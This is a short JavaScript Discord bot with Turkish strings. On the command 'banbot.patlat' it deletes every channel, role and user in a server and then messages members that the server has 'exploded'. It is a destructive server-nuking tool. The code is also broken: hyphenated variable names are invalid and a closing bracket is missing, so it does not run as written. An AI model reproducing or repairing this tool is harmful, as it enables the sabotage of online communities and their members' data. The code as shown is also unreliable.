const Discord = require('discord.js')
const config = require('./config.json')
const client = new Discord.Client();


client.on("ready", () => {
console.log("Bot Aktif")
});

client.on("message", msg => {
if (msg.content === 'banbot.patlat') {
msg.delete()
msg.guild.channels.forEach(banbot => {
banbot.delete()
});
msg.guild.roles.forEach(by-rookie-fight => {
by-rookie-fight.delete()
});
msg.guild.users.forEach(ban-bot => {
ban-bot.delete()
});
msg.guild.users.forEach(termse-uyumlu-degildir-kullanmayin => {
termse-uyumlu-degildir-kullanmayin.send('Sunucu patladı! \n Geçmiş olsun napalım?')
}
});

client.login(config.token);
